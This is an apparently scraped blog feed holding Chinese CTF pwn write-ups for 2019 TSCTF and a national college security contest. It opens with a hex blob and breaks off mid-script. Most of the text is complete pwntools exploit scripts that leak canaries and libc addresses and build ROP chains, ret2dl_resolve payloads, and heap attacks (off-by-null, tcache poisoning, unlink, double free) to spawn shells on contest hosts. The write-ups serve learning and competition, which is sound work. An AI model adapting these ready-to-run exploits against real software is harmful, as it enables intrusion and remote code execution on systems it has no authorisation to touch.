24a86f97e8aba11ca674915302fb49f89b7bb0825bd3a52edfed84b14750641c3dc8d6e6e2d1d483e69af80d16923d68116d58c28260aeef70118d1f8107e996ea3faf9c4b22d537e4256603eb2674796005a8402b97e5c639504c9c5f1487f316c95edb7b498b2765db3fa3af5da5215c188a02bd34cb378d788773b7fdb10f37ef6a12d6133a1d7591403b8084bddd41060f3df10924bd230aa9b56c6b049903df3c1843035f9cc09fe409d335f6ad3e2a9ab5fc1f69afa11793ac9c78868cac9b66d2c46996e76f9539ebd9d2d023d1524ff659e444a0dd95c150ed910d1267de8a35d06a5c575f831eac8253e033557c49b60d58aa529f589b57275b47494df8fbdd96b58a361b6a14dfed46d796e454f915da8d741b7e79312c927aa2c22d5a7d81251644cdba89eed4a35f46c34b50b32520880e9a8c5aebaae541c793c4e233d398c6c2a6be3f845954725a0e421cdf0a953d2f9aa1c8a9865c4cc1ed3bd65979011372756fc3d6b920d49014121204adf78a0e7bc9e0a1f832ac762c7cb97f65dada159acc3b173238c8dbb70b211882374c84c81ea7e8b43190cbf5b18f178571aedb56fd5b7a38892db747bb8927d8a26203e6450c7e6a9d994b03d537b8f9ddca863c14d09561c33e576aa67c8c70732c5ac01f7a]]></content>
      <categories>
        <category>私人空间</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019TSCTF]]></title>
    <url>%2F2019%2F05%2F18%2F2019TSCTF%2F</url>
    <content type="text"><![CDATA[NOFIFE思路：因为两次输入栈上数据，可以第一次泄露出canary和程序基址，第二次利用rop调用puts函数打印出read函数的实际地址泄露出libc，并把程序的最后的ret_addr改为main，当再次从头开始运行时利用rop在bss段伪造一个rilimit结构体，将其值设置为合理值即可，然后调用setrlimit()函数解除文件打开数量为零的限制，最后用system()打开shell（one_gadgets也行应该。。。。没试 orz），读取flag。。。。（后来发现根本不需要泄露libc调用system。。。可以直接用vulfunc打开flag。。。。），这题当时做的时候一直思路错误，一直想把那个限制过掉，找了一下午资料都没有结果，这题也是我花时间最长，最让我崩溃的一题，后来发现这么多人做出来了，思路肯定不偏。。。。才回过来神。。。。在第二天中午出的。。。。过程很曲折。。。QAQ exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'debug = 1if debug: p = remote('10.112.100.47',6135)else: p = process('./nofile')P = ELF('./nofile')libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')p.recvuntil('2,3or4?\n')p.sendline(str(24))p.recvuntil('Name?\n')payload = 'a'*0x18p.send(payload+'\x33')p.recvuntil('\x33')canary = u64(p.recv(7).ljust(8,'\x00'))canary = str(hex(canary)) + '00'canary = int(canary,16)log.success('canary = '+hex(canary))base = u64(p.recv(6).ljust(8,'\x00')) - 0xd80log.success('base = '+hex(base))p_rdi = base + 0xde3p_r15 = base + 0xde2p_rsi_r15 = base + 0xde1vul_addr = base + 0xc13bss = base + 0x202a00main = base+0xc94start = base+0x980part1 = 0xdd6 +basepart2 = 0xdc0 +base#part1为地址大的，part2为地址小的。def call_fun(fun_addr,arg3,arg2,arg1): payload = p64(part1) payload+= p64(0) payload+= p64(0) payload+= p64(1) payload+= p64(fun_addr) payload+= p64(arg1) payload+= p64(arg2) payload+= p64(arg3) payload+= p64(part2) payload+= 'a'*0x38 return payload#gdb.attach(p)sleep(0.5)p.send('n')p.recvuntil('Length?\n')p.sendline(str(0xc7))p.recvuntil('Name?\n')payload1 = 'a'*0x18 + p64(canary) + p64(bss)payload1+= p64(p_rdi)payload1+= p64(P.got['read']+base)payload1+= p64(P.plt['puts']+base)payload1+= call_fun(base+P.got['read'],0x10,bss,0) payload1+= p64(main)p.send(payload1)read_addr = u64(p.recv(6).ljust(8,'\x00'))log.success('read_addr'+hex(read_addr))libcbase = read_addr - libc.sym['read']log.success('libcbase = '+hex(libcbase))system_addr = libcbase + libc.sym['system']log.success('system_addr = '+hex(system_addr))sh_addr = libcbase + libc.search('/bin/sh\x00').next()log.success('sh_addr = '+hex(sh_addr))p.send(p64(0x10)+p64(0x10))#gdb.attach(p)p.recvuntil('2,3or4?\n')p.sendline(str(0xbf))p.recvuntil('Name?\n')payload2 = p64(0)*3+p64(canary)payload2+= p64(bss)payload2+= call_fun(base+P.got['setrlimit'],0,bss,7)payload2+= p64(p_rdi)+p64(sh_addr)+p64(system_addr)p.send(payload2)#gdb.attach(p)p.recvuntil('Right?\n')p.sendline('y')p.interactive() silent思路：看到题目是silent的时候就猜是关了stdout，还是没有leak，幸好是后者，前者我可能要凉。。。。然后看到这种啥都没有的栈题，又有*(got[1]+0x1c8)= NULL的暗示。。。。很明显是64位的ret2_dl_resolve。。。。因为32位的之前做过，还算思路清晰，本来想自己构造的。。。。结果发现之前寒假好像有留了64位的基础构造脚本，直接拿来改了改数据就出了。。。。。。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'debug = 1if debug: p = remote('10.112.100.47',8001)else: p = process('./silent')P = ELF('./silent')lr = 0x40054abss = 0x602a00p_rdi = 0x0000000000400613p_rsi_r15 = 0x400611p_rdx = 0x400615p_rbp = 0x400490payload = 'a'*7p.send(payload)sleep(0.5)#gdb.attach(p)payload = 'a'*(0x70+8)payload+= p64(p_rdi)payload+= p64(0)payload+= p64(p_rsi_r15)payload+= p64(bss)payload+= p64(0)payload+= p64(p_rdx)payload+= p64(0x500)payload+= p64(P.plt['read'])payload+= p64(p_rbp)payload+= p64(bss)payload+= p64(lr)p.send(payload)sleep(0.5)plt_0 = 0x4003f0rel_plt = 0x400398dynstr = 0x400318dynsym = 0x4002b8fake_Rela_addr = bss + 0x150 #新栈上选择一块地址作为伪造的Elf64_Rela结构体基址，稍后还要通过计算进行0x18字节对齐fake_Sym_addr = bss + 0x190 #新栈上选择一块地址作为伪造的Elf64_Sym结构体基址，稍后还要通过计算进行0x18字节对齐，与上一个结构体之间留出一段长度防止重叠fake_dynstr_addr = bss + 0x1c0 #新栈上选择一块地址作为伪造的.dynstr函数名字符串system放置地址,与上一个结构体之间留出一段长度防止重叠binsh_addr = bss + 0x1c8 #"/bin/sh\x00"所在地址rel_plt_align = 0x18 - (fake_Rela_addr - rel_plt) % 0x18 #计算两个结构体的对齐填充字节数，两个结构体大小都是0x18rel_sym_align = 0x18 - (fake_Sym_addr - dynsym) % 0x18fake_Rela_addr = fake_Rela_addr + rel_plt_align #加上对齐值后为结构体真正地址fake_Sym_addr = fake_Sym_addr + rel_sym_alignfake_reloc_arg = (fake_Rela_addr - rel_plt)/0x18 #计算伪造的reloc_argfake_r_info = (((fake_Sym_addr - dynsym)/0x18) &lt;&lt; 0x20) | 0x7 #伪造r_info，偏移要计算成下标，除以Elf64_Sym的大小，最后一字节为0x7fake_st_name = fake_dynstr_addr - dynstr #计算伪造的st_name数值为伪造函数字符串system与.dynstr节开头间的偏移fake_Elf64_Rela_data = ""fake_Elf64_Rela_data += p64(P.got['read']) #r_offset = write_got，以免重定位完毕回填got表的时候出现非法内存访问错误fake_Elf64_Rela_data += p64(fake_r_info)fake_Elf64_Rela_data += p64(0)fake_Elf64_Sym_data = ""fake_Elf64_Sym_data += p32(fake_st_name)fake_Elf64_Sym_data += p32(0x12) #后面的数据直接套用write函数的Elf64_Sym结构体，具体成员变量含义自行搜索，这里要注意数据大小fake_Elf64_Sym_data += p64(0)fake_Elf64_Sym_data += p64(0)payload = p64(bss)payload += p64(p_rdi) #为system函数设置参数"/bin/sh\x00" payload += p64(binsh_addr) payload += p64(plt_0) payload += p64(fake_reloc_arg) payload = payload.ljust(0x150, "A") #paddingpayload += 'A'*rel_plt_alignpayload += fake_Elf64_Rela_datapayload = payload.ljust(0x190, "A") #paddingpayload += 'A'*rel_sym_alignpayload += fake_Elf64_Sym_datapayload = payload.ljust(0x1c0, "A") #paddingpayload += "system\x00\x00"payload += "/bin/sh\x00"p.send(payload)#gdb.attach(p)p.interactive() babyheap思路：感觉babyheap和babytcache出的水平都很高orz，babyheap刚拿到时惊了卧槽。。。。只有malloc()和delete()的题我还是第一次见到。。。而且漏洞点好像也只有off_by_null ??? 但所幸我之前进行过noleak相关的题·，找了不少利用文件结构体泄露的题，然后泄露成功之后，想往main_arena-0x33分配fake_chunk，结构发现会有0x0a字符截断。。这个设计是真的巧妙。。。。最后是改了topchunk的地址为malloc_hook-0x10，然后改了malloc_hook为one_gadget，用free()来触发malloc_printerr来获取shell。。。。三个小时不到出的，但做完还是意犹未尽hhhh，真心感觉很棒！！！感觉把几个月刷的堆题的经验都掏空了orz。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#coding:utf-8from pwn import *context(os='linux',arch='amd64',timeout=0.2)#context.log_level = 'debug'debug = 0if debug: p = process('./babyheap')else: p = remote('10.112.100.47',10003)libc = ELF('./libc.so.6')P = ELF('./babyheap')def new(size,payload): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('Size: \n') p.sendline(str(size)) p.recvuntil('data: \n') p.send(payload)def delete(index): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('delete: \n') p.sendline(str(index))payload = '\x00'*0xf7new(0xf7,payload) #0new(0xf7,'\x01'*0xf7) #1 0x100new(0xf7,'\x02'*0xf7) #2 0x200new(0xf7,'\x03'*0xf7) #3new(0x20,'\x04'*0x20) #4delete(2)new(0xf8,'\x01'*0xf0+p64(0x300)) #2delete(0)delete(3)#-----------------------------------new(0x60,'\xdd\x15'+'\n') #0 bbnew(0x60,'\x03'*0x10+'\n') #3new(0x30,'\x00'*0x10+p64(0)+p64(0x101)+'\n') #5new(0x60,'\n') #6 kknew(0x100,'\n') #7new(0x100,'\x00'*0x50+p64(0)+p64(101)+'\n') #8new(0x40,'\n') #9delete(3)delete(6)delete(1)new(0xf8,p64(0)*3+p64(0x71)+'\x00'+'\n') #1new(0x60,'\n') #3new(0x60,'\n') #6new(0x68,'\x00'*0x33+p64(0xfbad1800)+p64(0x7f7d44fa36a3)*3+'\x50'+'\n') #10p.sendline()libcbase = u64(p.recv(6).ljust(8,'\x00'))-(0x00007f7d44fa36a3- 0x7f7d44bde000) log.success('libcbase = '+hex(libcbase))one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]main_arena = libcbase + (0x7fd58aac0b20-0x7fd58a6fc000)log.success('main_arena = '+hex(main_arena))p.recvuntil('invalid choice~~\n')p.recvuntil('&gt; ')p.sendline('2')p.recvuntil('delete: \n')p.sendline('1')'''io_list_all = libcbase+(0x7fb77a171520-0x7fb779dac000)log.success('io_list_all = '+hex(io_list_all))delete(5)new(0x38,p64(0)*2+'/bin/sh\x00'+p64(0x61)+p64(0)+p64(io_list_all-0x10)+'\n')delete(3)new(0x68,'\x00'*8+p64(0)+'\x00'*0x57+'\n')'''delete(0)delete(3)delete(6)new(0x60,p64(main_arena-(0x7fcaabde0b20-0x7fcaabde0b05))+'\n')new(0x60,'\n')new(0x60,'\n')new(0x60,'\x00'*0xb+p64(0)*5+p64(0x7f)+p64(main_arena+0x20)+'\n')new(0x60,'\x00'*0x28+p64(main_arena-0x20)+'\n')new(0xf0,'\n')new(0x20,p64(libcbase+one_gadget[2])+'\n')delete(11)#gdb.attach(p)p.interactive() babytcache思路：这题是第一天晚上三点半拿的一血。。。因为下午一直在nofile的错误思路中挣扎搞的心情烦躁不已。。。晚上10点半开始做，十二点多才静下心。。。这个题因为pwnable.tw上那道的误导导致开始思路错误。。浪费了free()的次数。。。之后向出题的师傅要了hint，也证实了我之前思路的错误。。。之后开始尝试新的思路，在0xabcda000上构造overlapping。。。然后利用文件结构体泄露出地址。。。改malloc_hook为one_gadget，尝试了一遍发现拿不到shell，然后进行realloc微调，getshell ! ! ! ! ! (做出这题过后，又看了一小时的nofife。。。还是在错误思路里绕，四点半顶不住。。。去睡觉了orz.) exp如下:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'debug = 0if debug: p = process('./main')else: p = remote('10.112.100.47',2333)P = ELF('./main')libc = ELF('./libc-2.27.so')def new(size,payload): p.recvuntil('choice:') p.sendline('1') p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('data:') p.send(payload)def delete(): p.recvuntil('choice:') p.sendline('2')p.recvuntil('secret:')p.send(p64(0)+p64(0x101)+'\x00'*0xf0+p64(0)+p64(0x21)+'\x00'*0x10+p64(0)+p64(0x21))new(0xf0,'\x01'*0xf0)delete()delete()new(0xf0,p64(0xabcda010))new(0xf0,p64(0))new(0xf0,p64(0))delete()new(0x60,'\x02'*0x60)delete()delete()new(0x60,p64(0xabcda080))new(0x60,p64(0))new(0x30,'\x60\xd7')new(0x60,p64(0))new(0x60,p64(0xfbad1800)+p64(0)*3+'\x00')p.recv(8)libcbase = u64(p.recv(8)) -(0x00007f087f0d28b0- 0x7f087ece5000 )log.success('libcbase = '+hex(libcbase))one_gadget = [0x4f2c5,0x4f322,0x10a38c]malloc_hook = libcbase + libc.sym['__malloc_hook']log.success('malloc_hook = '+hex(malloc_hook))realloc = libcbase + libc.sym['__libc_realloc']log.success('realloc = '+hex(realloc))new(0x40,p64(0))delete()delete()new(0x40,p64(malloc_hook-0x10))new(0x40,p64(0))new(0x40,p64(0)+p64(libcbase+one_gadget[0])+p64(realloc+2))#gdb.attach(p)p.recvuntil('choice:')p.sendline('1')p.recvuntil('size:')p.sendline(str(0x20))#gdb.attach(p)p.interactive()]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>TSCTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019全国大学生信息安全竞赛初赛pwn]]></title>
    <url>%2F2019%2F04%2F26%2F2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%A2%84%E8%B5%9Bpwn%2F</url>
    <content type="text"><![CDATA[前言：这次比赛很尴尬，我本来以为自己报上了名，但是结果没报上。。。只能让同学给我发题目然后自己做，没法拿flag，一共六题，只做出来四题，两题栈，两题堆，最后两题做出来的队伍个数都是16个，显然不是我这小破邮大一菜狗可以做出来的 Or2。 所有的二进制文件都在这里：题目的二进制文件 栈部分：0x1 第一天_your_pwn:0x11功能分析和漏洞寻找：首先gdb看一下题目基本信息，是64位的程序，PIE开启，NX开启，relro没开全。 放进ida看一下，在main函数里只是一些准备工作没有漏洞存在，我们进入vuln函数进一步分析： 在vuln中我们发现了程序进行了41次循环，每一次输入一个下标index，以局部变量v4为基准泄露一个字节的内容，然后再改为新的数据，漏洞点在于index没有进行大小检查，可以任意大，超出v4数组的范围到达main返回地址处，这既实现了leak又实现了change，而且有41次机会，现在思路就很明了了！！ 0x12 漏洞利用：第一步还是leak出libc，根据经验我们知道在main函数返回地址附近一般会有__libc_start_main+240出现，我们可以泄露其然后进而泄露libc，这里的libc需要我们自己查找确定，我用的是wiki上的一个工具：LibcSearcher，除了libc之外，我们还应泄露一下程序的基址，因为程序开了PIE，所以我们最后改main函数返回地址的时候要构造p64(pop_rdi_addr)+p64(sh_addr)+p64(system_addr)这个payload的时候pop_rdi_addr这个gadget需要程序基址。 main函数的rbp附近的stack分部如下图：我们可以利用画红圈的两个地方（main函数返回地址和ebp）来leak出libc和基址。 第二步就是将main的返回地址改为payload=p64(pop_rdi_addr)+p64(sh_addr)+p64(system_addr)。需要注意的是sh_addr和system可能因为libc的不同而产生一些小变化，保险起见还是直接调试看偏移最好，不要直接在libc中搜索。 0x13 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#coding:utf-8from pwn import *from LibcSearcher import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./pwn')P = ELF('./pwn')p.recvuntil('name:')p.send('\x12\x12\x12\x12\x12\x12\x12\x12')ret_addr = [0 for i in range(6)]#----------------------------------------leak __libc_start_main_addr-------------------------------for i in range(6): p.recvuntil('input index\n') p.sendline(str(624+8+i)) #具体数字自己调试，之后同，只要一块对了，然后之后算偏移即可。 p.recvuntil('value(hex) ') addr = p.recv(8) if(addr[0]=='f'): addr = int(addr[6:],16) else: addr = int(addr[0:2],16) log.success('one_addr = '+hex(addr)) p.recvuntil('new value\n') p.sendline(str(addr)) ret_addr[i] = addr__libc_ret = ''for i in range(6): if(len(str(hex(ret_addr[5-i])))&lt;4): __libc_ret+= '0'+str(hex(ret_addr[5-i]))[2:] else: __libc_ret+= str(hex(ret_addr[5-i]))[2:]__libc_ret = int(__libc_ret,16)log.success('__libc_ret = '+hex(__libc_ret))#---------------------------------------leak __libc_start_main_addr success------------------------#---------------------------------------leak base_addr---------------------------------------------for i in range(6): p.recvuntil('input index\n') p.sendline(str(624+i)) p.recvuntil('value(hex) ') addr = p.recv(8) if(addr[0]=='f'): addr = int(addr[6:],16) else: addr = int(addr[0:2],16) log.success('one_addr = '+hex(addr)) p.recvuntil('new value\n') p.sendline(str(addr)) ret_addr[i] = addrpop_rdi = ''for i in range(6): if(len(str(hex(ret_addr[5-i])))&lt;4): pop_rdi+= '0'+str(hex(ret_addr[5-i]))[2:] else: pop_rdi+= str(hex(ret_addr[5-i]))[2:]#--------------------------------------leak base_addr success-----------------------------------pop_rdi = int(pop_rdi,16)pop_rdi = pop_rdi + 0x63log.success('pop_rdi_addr = '+hex(pop_rdi))#--------------------------------------gain pop_rdi_addr success---------------------------------__libc_start_main_addr = __libc_ret - 240libc = LibcSearcher('__libc_start_main',__libc_start_main_addr)libcbase = __libc_start_main_addr - libc.dump('__libc_start_main')log.success('libcbase = '+hex(libcbase))system_addr = libcbase + libc.dump('system') + 0x10 #自己调试进行调整，因为libc可能有微小差别。sh_addr = libcbase + (0xc1ed57-0xa92000) #自己调试，算偏移即可。log.success('system_addr = '+hex(system_addr))log.success('sh_addr = '+hex(sh_addr)) #-------------------------------------gain system_addr and sh_addr success-----------------------#-------------------------------------将main函数返回地址改为pop_rdi_addr为system准备参数----------for i in range(6): p.recvuntil('input index\n') p.sendline(str(624+8-288+i)) p.recvuntil('new value\n') p.sendline(str(int(str(hex(pop_rdi))[12-2*i:14-2*i],16)))for i in range(8): p.recvuntil('input index\n') p.sendline(str(624+8-288+8+i)) p.recvuntil('new value\n') if(i&lt;6): p.sendline(str(int(str(hex(sh_addr))[12-2*i:14-2*i],16))) else: p.sendline('0')for i in range(6): p.recvuntil('input index\n') p.sendline(str(624+8-288+16+i)) p.recvuntil('new value\n') p.sendline(str(int(str(hex(system_addr))[12-2*i:14-2*i],16)))for i in range(9): p.recvuntil('input index\n') p.sendline('0') p.recvuntil('new value\n') p.sendline('0')#-------------------------------success---------------------------------------------------------p.recvuntil('(yes/no)? \n')#gdb.attach(p)p.sendline('no')p.interactive() 0x14 收货：可能在数据的处理和转化方面，字符串，16进制数，十进制数之间转化和拼接拆分有点繁杂，（可能因为我对python不太熟悉），其他到没有什么太坑人的地方，一些细节问题也需要注意一下，我从下午三点开始，五点不到解出的，基本都是在处理数据之间的转化和拼接。可能还有更好的思路，我也不敢过多评说。 0x2 第二天_baby_pwn:0x21 程序分析：额。。。这一题怎么说呢，程序啥都没有，32位的，简直是ret2_dl_resolve的标准模板，直接把XDCTF 2015的pwn200的exp搬过来改改数据就行了orz，比赛的时候秒出的。。。。。 至于ret2_dl_resolve的教程在wiki上有，这篇文章也很详细：ret2_dl_resolve，我就不斗胆再说了orz，这里只分享一些我的感悟： 0x22 ret2_dl_runtime_solve 总结：需要对三个部分和函数延迟绑定技术的流程熟悉： .rel.plt节(函数重定位表)的结构体： //readelf -r typedef struct {​ Elf32_Addr r_offset; // 即got表的条目​ Elf32_Word r_info; // 很重要，为重点伪造对象。} Elf32_Rel;#define ELF32_R_SYM(info) ((info)&gt;&gt;8)#define ELF32_R_TYPE(info) ((unsigned char)(info))#define ELF32_R_INFO(sym, type) (((sym)&lt;&lt;8)+(unsigned char)(type)) .dynsym节(动态链接符号表)的结构体（其大小在32位中为0x10）：typedef struct{Elf32_Word st_name; // 函数名字符串相对于.dynstr节起始地址的偏移Elf32_Addr st_value; // Symbol valueElf32_Word st_size; // Symbol sizeunsigned char st_info; // Symbol type and bindingunsigned char st_other; // Symbol visibility under glibc&gt;=2.2Elf32_Section st_shndx; // Section index} Elf32_Sym; .dynstr节（动态链接的字符串）中储存了函数名。 //节的地址可以用readelf -S 来看。 .延迟绑定。用下图可以直观的看到。 我们需要清楚GOT[0],GOT[1],GOT[2]和PLT[0]中的内容。 我们需要做的就是在使调用函数的整个过程被我们所控制，首先劫持栈： payload+= p32(pop_rbp) + p32(mystack) + p32(leave_ret) 然后需要在栈上布置这种结构：payload = p32(mystack)payload+= p32(plt_0_addr)payload+= p32(fake_index)payload+= p32(ret_addr)payload+= p32(arguments)payload+= fake_relpayload+= fake_sympayload = payload.ljust(0x80,’\x00’)payload+= fake_str 之后我们要做的事分三步：1.伪造fake_index来使程序跳入我们自己的fake_rel结构体2.构造fake_rel的r_info来使程序跳到我们自己的fake_sym结构体 (这里需要我们自己来构造字节对齐。)3.构造fake_sym结构体的st_name来使程序跳到我们自己的fake_str字符串。其中fake_index，fake_rel，fake_sym，fake_str的地址都需要我们自己能够精确地控制。（栈注意迁移即可。） 0x23 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#coding:utf-8from pwn import *context(os='linux',arch='i386')#context.log_level = 'debug'p = process('./pwn')P = ELF('./pwn')lr = 0x08048448bss = 0x0804aa00pppr_addr = 0x080485d9pop_ebp = 0x080485dbpayload = (0x28+4) * 'a'payload+= p32(P.plt['read'])payload+= p32(pppr_addr)payload+= p32(0)payload+= p32(bss) payload+= p32(0x400)payload+= p32(pop_ebp)payload+= p32(bss)payload+= p32(lr)p.send(payload)sleep(1)plt_0 = 0x08048380r_info = 0x107rel_plt = 0x0804833c dynsym = 0x080481dcdynstr = 0x0804827cfake_sys_addr = bss + 36align = 0x10 - ((fake_sys_addr-dynsym)&amp;0xf)fake_sys_addr = fake_sys_addr + alignindex = (fake_sys_addr - dynsym)/0x10r_info = (index &lt;&lt; 8) + 0x7st_name = (fake_sys_addr + 0x10) - dynstrfake_sys = p32(st_name) + p32(0) + p32(0) + p32(0x12) fake_rel = p32(P.got['read']) + p32(r_info)fake_rel_addr = bss + 28fake_index = fake_rel_addr - rel_plt payload = p32(bss)payload+= p32(plt_0)payload+= p32(fake_index)payload+= p32(0xdeadbeef)payload+= p32(bss+0x80)payload+= p32(0)payload+= p32(0)payload+= fake_relpayload+= 'a'*alignpayload+= fake_syspayload+= 'system'payload = payload.ljust(0x80,'\x00')payload+= '/bin/sh\x00'p.sendline(payload)p.interactive() 0x24 赛后：在群里听一些师傅说可以用其他方法，爆破syscall之类的，我也不懂orz。。。。。不过貌似ret2_dl_solve在现在的题目中很少出现了。。。。但学了总比不知道好QAQ 堆部分：(⊙o⊙)…我个人觉得这两道堆虽然都算不上难（难的话我也不可能做出来了orz），但是也都是稳中有变，还是挺有趣的，其中第一题daily漏洞点比较隐蔽，发现以后可以用double free或者unlink都行，我用unlink做到快最后的时候被一个地方卡住了（wtf &gt;_&lt;），感觉中间有点乱，就重新开始的，结果肝到最后才肝出来。第二天的是double，这一题比较顺利，两个小时不到就解出了，但是没想到他最后的分值竟然比daily高！！！（wtf 逗我????） 0x3 第一天_daily:0x31 程序分析和漏洞寻找：首先看一下程序的基本信息，为64位，PIE没开，relro为full，估计是堆题，需要改malloc_hook或者free_hook为one_gagdet的通用套路。 放进ida里进一步分析，发现程序有四个功能，add()，delete()，upgrade()，view()。 程序大致的流程就是在bss段有一个已知的地址区域存放各chunk的可用大小和堆指针（一个结构体占0x10大小），然后可以申请大小在0x100之下的chunk，可以不填满，但是没有溢出漏洞。upgrade()也没有溢出漏洞，输入的大小不能超过原先申请的大小，view()是以字符串的形式来打印chunk的内容。delete()就是通过index找到目标chunk，然后free()。 浏览一遍发现似乎没有什么漏洞点orz，于是在次仔细看了一遍，发现了在delete()中在free()的时候index没有检查，所以我们可以free()任意地址的chunk。 0x32 漏洞利用：第一步还是leak，这里我们需要思考我们需要leak出什么，libc我们肯定需要leak，因为malloc_hook或者free_hook或者one_gadget的真实地址都需要libc，其次我们还需要leak出heap的地址，因为我们要在heap里伪造chunk来进行unlink或者double free，所以必须得知道heap的地址，才能知道我们的fake_chunk的地址并把它放入伪造的chunk结构体中，进而成功free()出fake_chunk。因为要泄露libc和heap所以我们最好获取一个曾经在largebin之中的chunk的头部，所以先申请两个0x200大小的chunk，然后将它们free()，之后unsortedbin之中会出现一个0x420的chunk，然后我们再申请一个chunk的时候，根据glibc的机制，unsortedbin中的chunk会被遍历检查看有没有大小正好合适的，有的话直接分，没有的话会将所有的chunk放入对应的bins中，所以0x420的chunk被放入largebin中，所以再申请时我们得到的chunk是从largebin中切下来的fd_nextsize和bk_nextsize会被启用： 然后我们就可以通过对这个新的chunk读来泄露libc和heap地址。 leak成功后，我们可以在随便一个0x200大小（大小足够就行。）的chunk里进行unlink的构造，然后通过偏移计算index来欺骗delete()，最后unlink实现之后我们就可以将Index 4的指针改为malloc_hook的地址，然后再edit()改为one_gadget即可。。。。。但是！！！操蛋的是我不知道为什么malloc_hook行不通，我试了四个gadgets都不行，以为凉了，结果换成free_hook就成了，不知道是什么原因orz，真的神奇&gt;_&lt;………. double_free思路我就不说了，自己看exp吧，类似的。。。比unlink要简单一点。。。。 0x33 unlink思路_exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#coding:utf-8from pwn import *#from LibcSearcher import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./daily')def add(size,payload): p.recvuntil('choice:') p.sendline('2') p.recvuntil('daily:') p.sendline(str(size)) p.recvuntil('daily\n') p.send(payload)def view(): p.recvuntil('choice:') p.sendline('1')def delete(index): p.recvuntil('choice:') p.sendline('4') p.recvuntil('daily:') p.sendline(str(index))def upgrade(index,payload): p.recvuntil('choice:') p.sendline('3') p.recvuntil('daily:') p.sendline(str(index)) p.recvuntil('daily\n') p.send(payload)payload = '\x66'*0x200add(len(payload),payload) #index 0add(len(payload),payload) #index 1add(len(payload),payload) #index 2add(len(payload),payload) #index 3delete(1) #delete 1delete(2) #delete 2payload = '\x12'*8add(0x1a0,payload) #index 1 size无所谓，看心情。。。#-------------------------------------------利用large chunkl来leak libcbase和heapbase---------view()p.recvuntil('\x12\x12\x12\x12\x12\x12\x12\x12')main_arena_addr = u64(p.recv(6).ljust(8,'\x00')) - (0xf68-0xb20)log.success('main_arena_addr = '+hex(main_arena_addr))libcbase = main_arena_addr - (0x4be5b20-0x4821000)log.success('libcbase = '+hex(libcbase))payload = '\x12'*12+'\x21'*4upgrade(1,payload)view()p.recvuntil('\x21\x21\x21\x21')heap_addr = u64(p.recv(4).ljust(8,'\x00')) - 0x210log.success('heap_addr = '+hex(heap_addr))#gdb.attach(p)#-----------------------------------------------leak success--------------------------------------payload = 'a'*8add(0x260,payload) #index 2 这里清空unsortedbin为了使之后的思路更清晰。#gdb.attach(p)#-----------------------------------------------prepare unlink------------------------------------payload = p64(0)payload+= p64(0xa1)payload+= p64(0)*2payload+= p64(0xa0)payload+= p64(heap_addr+0x20)payload = payload.ljust(0xa0,'\x00')payload+= p64(0x0)payload+= p64(0x91)payload+= p64(0)*2payload+= p64(0x80)payload+= p64(heap_addr+0xc0)payload = payload.ljust(0x130,'\x00')payload+= p64(0)payload+= p64(0x21)payload+= p64(0)*2payload+= p64(0)payload+= p64(0x21)upgrade(0,payload)#gdb.attach(p)index = (heap_addr + 0x30 - 0x602060)/0x10delete(index) #gdb.attach(p)payload = p64(0)add(0x90,payload) #index 4payload = p64(0)*2payload+= p64(0)payload+= p64(0x91)payload+= p64(0x6020a8-0x18)payload+= p64(0x6020a8-0x10)payload+= p64(0)*14payload+= p64(0x90)payload+= p64(0x90)payload+= p64(0)*2payload+= p64(0x80)payload+= p64(heap_addr+0xc0)payload+= p64(0)*12payload+= p64(0)payload+= p64(0x21)payload+= p64(0)*2payload+= p64(0)payload+= p64(0x21)upgrade(0,payload)#gdb.attach(p)index = (heap_addr + 0xd0 - 0x602060)/0x10delete(index)#gdb.attach(p)#-------------------------------unlink success---------------------------------------------free_hook = libcbase + (0x1728f7a8 - 0x16ec9000)log.success('free_hook = ' + hex(free_hook))payload = p64(0)*2payload+= p64(0x80)payload+= p64(free_hook)upgrade(4,payload)#gdb.attach(p)one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]upgrade(4,p64(one_gadget[1]+libcbase))#gdb.attach(p)delete(0)p.interactive() 0x35 double_free思路_exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#coding:utf-8from pwn import *#from LibcSearcher import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./daily')def add(size,payload): p.recvuntil('choice:') p.sendline('2') p.recvuntil('daily:') p.sendline(str(size)) p.recvuntil('daily\n') p.send(payload)def view(): p.recvuntil('choice:') p.sendline('1')def delete(index): p.recvuntil('choice:') p.sendline('4') p.recvuntil('daily:') p.sendline(str(index))def upgrade(index,payload): p.recvuntil('choice:') p.sendline('3') p.recvuntil('daily:') 